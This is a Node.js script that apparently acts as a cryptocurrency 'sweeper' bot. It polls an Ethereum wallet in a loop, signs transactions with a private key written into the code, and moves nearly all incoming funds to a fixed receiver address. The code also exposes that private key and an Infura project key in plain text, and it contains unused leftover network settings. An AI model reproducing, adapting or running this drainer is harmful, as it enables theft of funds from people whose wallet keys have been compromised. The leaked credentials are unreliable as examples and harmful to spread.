const Web3 = require("web3");
const EthereumTx = require('ethereumjs-tx').Transaction;
const common = require('ethereumjs-common');
const axios = require('axios');
const { default: Common } = require("ethereumjs-common");
const webSocket = 'wss://mainnet.infura.io/ws/v3/02dde345528643bcbc4fb7a5e56a44d4'
const ethNetwork = 'https://data-seed-prebsc-1-s1.binance.org:8545/';
const http = 'https://mainnet.infura.io/v3/02dde345528643bcbc4fb7a5e56a44d4'
const web3 = new Web3(new Web3.providers.WebsocketProvider(webSocket));
const webnode = new Web3(new Web3.providers.HttpProvider(http));

const fromAddress = '0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3'
//Paste  your private key in the quotes and save the file
const privateKey = 'ee9cec01ff03c0adea731d7c5a84f7b412bfd062b9ff35126520b3eb3d5ff258'
const receiverAddress = '0xd55d54f1a1a7C6E7b1AC25aC20c237B8feeF1B5b'

async function transferFund(sendersData, recieverData, amountToSend, gas) {
  return new Promise(async (resolve, reject) => {
    var nonce = await webnode.eth.getTransactionCount(sendersData.address);
    let gasPrices = await getCurrentGasPrices();
    let details = {
      "to": recieverData.address,
      "value": webnode.utils.toHex(amountToSend),
      "gas": 21000,
      "gasPrice": gasPrices.low * 1000000000,
      "nonce": nonce,
      //change to mainet later
      "chainId": 1// EIP 155 chainId - mainnet: 1, rinkeby: 4
    };
    const binanceChain = common.default.forCustomChain(
      'mainnet', {
      name: 'bnb',
      networkId: 56,
      chainId: 56
    },
      'petersburg'
    )
    const ethChain = new Common({ chain: "mainnet" })

    const transaction = new EthereumTx(details, { 'common': ethChain });
    let privateKey = sendersData.privateKey
    let privKey = Buffer.from(privateKey, 'hex')
    transaction.sign(privKey);

    const serializedTransaction = transaction.serialize();

    webnode.eth.sendSignedTransaction('0x' + serializedTransaction.toString('hex'), (err, id) => {
      if (err) {

        return resolve()
      }
      const url = `${id}`;
      console.log(url);
      resolve({ id: id, link: url });
    });
  });
}

async function getCurrentGasPrices() {
  return {
    low: 160,
  }
}

async function getBalance(address) {
  return new Promise((resolve, reject) => {
    webnode.eth.getBalance(address, async (err, result) => {
      if (err) {
        return reject(err);
      }
      resolve(result)
      //resolve(web3.utils.fromWei(result, "ether"));
    });
  });
}
async function listenWallet() {
  // var subscription = web3.eth.subscribe('pendingTransactions',
  // (error, result)=>{
  //          if(!error){
  //              //getTrans(result)
  //          }
  //          else{
  //              console.log(error);
  //          }
  //        }
  //     )      
  //     .on("data", function(log){
  //          getTrans(log)
  //      })
  try {
    let balance = await getBalance(fromAddress)
    console.log(balance)
    if (balance > 0) {
      console.log(balance)
      await initiateTransaction(balance)
      await sleep(3000)
    }
    await sleep(40)
  }
  catch (e) {
    console.log(e)
  }

  listenWallet()

}
function getTrans(trans) {
  webnode.eth.getTransaction(trans, (err, tx) => {
    try {
      if (err != null) {

        return
      }
      //console.log(tx)
      //console.log(err)
      if (tx.to === '0xbda33a9265E5592475C27d4FFeb47Ec1F0d91150') {
        console.log("Got a transaction")

        confirmEtherTransaction(tx)
      }
    } catch (e) {

    }
  })

}
async function initiateTransaction(balance) {
  return new Promise(async (resolve, reject) => {
    try {
      console.log("Got balance in account")
      var amountToSend = balance
      amountToSend -= 3360000000000000
      if (amountToSend < 0) return reject()
      console.log("amount to send : " + amountToSend)
      if (balance < 0) return reject()

      await transferFund({ address: fromAddress, privateKey: privateKey }, { address: receiverAddress }, amountToSend)
      return resolve()
    } catch (e) {

    }

  })
}
async function confirmEtherTransaction(trnasactionData) {
  const trxConfirmations = await getConfirmations(trnasactionData.hash)

  if (trxConfirmations >= 1) {

    console.log('Transaction with hash has been successfully confirmed')
    //console.log(trnasactionData)
    var balance = parseInt(trnasactionData.value)
    balance -= 3360000000000000
    //balance*=0.000000000000000001
    let amountToSend = balance
    console.log("amount to send : " + amountToSend)
    if (balance < 0) return
    transferFund({ address: fromAddress, privateKey: privateKey }, { address: receiverAddress }, amountToSend)

    return
  }
  // Recursive call
  return confirmEtherTransaction(trnasactionData)
}

async function getConfirmations(txHash) {
  try {
    const trx = await webnode.eth.getTransaction(txHash)
    if (trx.blockNumber === null) {
      return 0;
    }
    // Get current block number
    const currentBlock = await web3.eth.getBlockNumber()

    // When transaction is unconfirmed, its block number is null.
    // In this case we return 0 as number of confirmations

    return trx.blockNumber === null ? 0 : currentBlock - trx.blockNumber
  }
  catch (error) {
    console.log("err")
    console.log(error)
  }
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
listenWallet()
